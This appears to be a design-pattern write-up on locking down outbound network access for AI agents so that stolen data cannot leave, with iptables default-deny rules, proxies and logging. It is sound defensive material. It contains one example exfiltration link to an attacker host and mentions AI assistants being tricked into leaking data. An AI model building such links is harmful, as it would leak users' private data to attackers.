---
title: Egress Lockdown (No-Exfiltration Channel)
status: established
authors: ["Nikola Balic (@nibzard)"]
based_on: ["Simon Willison (observation)", "Multiple vendor incident reports"]
category: Tool Use & Environment
source: "https://simonwillison.net/2025/Jun/16/lethal-trifecta/"
tags: [network-sandbox, exfiltration, outbound-controls, security]
---

## Problem
Even with private-data access and untrusted inputs, attacks fail if the agent has **no way to transmit stolen data**. Many real-world fixes simply removed or filtered outbound channels.

## Solution
Implement an **egress firewall** for agent tools:

- Allow only specific domains, methods, or payload sizes.  
- Strip or hash content in any permitted outbound call.  
- Forbid dynamic link generation (e.g., `http://attacker.com/?q=<data>`).  
- Where external communication is essential, run it in a separate "dumb" worker that cannot see private data.

```bash
# Docker file example
RUN iptables -P OUTPUT DROP       # default-deny
RUN iptables -A OUTPUT -d api.mycompany.internal -j ACCEPT
```

## How to use it

* Place the agent inside a sandboxed VM or container with outbound rules.
* Provide needed APIs via an internal proxy; audit that proxy's request schema.
* Log any DROP events for forensic follow-up.

## Trade-offs

**Pros:** Drastically reduces high-impact leaks; easy to reason about.
**Cons:** Breaks legitimate integrations; requires proxy stubs for essential calls.

## References

* Multiple vendor post-mortems cited by Willison: Microsoft 365 Copilot, GitHub MCP, GitLab Duo Chatbot fixes all disabled egress paths as the first patch.